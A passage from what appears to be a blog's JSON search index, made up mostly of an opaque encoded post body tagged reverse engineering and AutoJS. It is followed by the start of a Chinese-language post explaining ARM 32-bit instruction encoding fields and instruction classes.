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","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"AutoJS","slug":"AutoJS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"}]},{"title":"再谈arm指令编码","date":"2019-04-15T06:42:12.000Z","path":"2019/04/15/arm-instruction-encode/arm-instruction-encode/","text":"再谈arm指令编码背景最近在做一个项目中需要patch arm指令，由于之前只是对arm指令编码了解一个大概，但patch指令需要对其指令编码十分熟悉才可以，所以重新学习了一遍arm指令。记录下学习结果。 arm指令编码与x86指令的编码不同，arm指令是一个定长的指令编码格式，这种方式有很多好处，方便流水线的方式指令解码。这里arm指令采用的是32位等长编码格式。按类型的位域分布，如下所示： 31 30 29 28 27 26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 cond op1 op arm指令按照功能可以分为以下几类： 数据处理与杂项指令 加载存储指令 媒介指令 分支、块数据传输指令 软中断与协处理指令 无条件指令指令 每一类指令有有着自己的位域分布，具体的常见指令格式如下： 